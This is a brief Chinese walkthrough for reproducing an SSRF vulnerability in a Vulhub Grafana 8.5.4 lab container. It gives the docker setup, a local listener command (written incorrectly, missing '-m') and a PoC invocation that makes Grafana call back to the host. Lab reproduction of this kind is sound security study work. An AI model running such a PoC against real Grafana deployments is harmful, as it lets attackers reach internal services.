开启靶场：
```
docker compose up -d
```
访问页面：
```
http://localhost:3000
```
需修改代理变量：
```
services: 
 web: 
  image: vulhub/grafana:8.5.4 
  environment:
   - http_proxy=
   - https_proxy= 
   - HTTP_PROXY= 
   - HTTPS_PROXY= 
  ports: 
   - "3000:3000"
```
先开启一个服务器代理：
```
python3 http.server 8000
```
使用POC来复现SSRF漏洞：
```
python3 grafana-ssrf.py -H http://localhost:3000 -u http://host.docker.internal:8000/attack
```
然后服务器代理就会收到attack
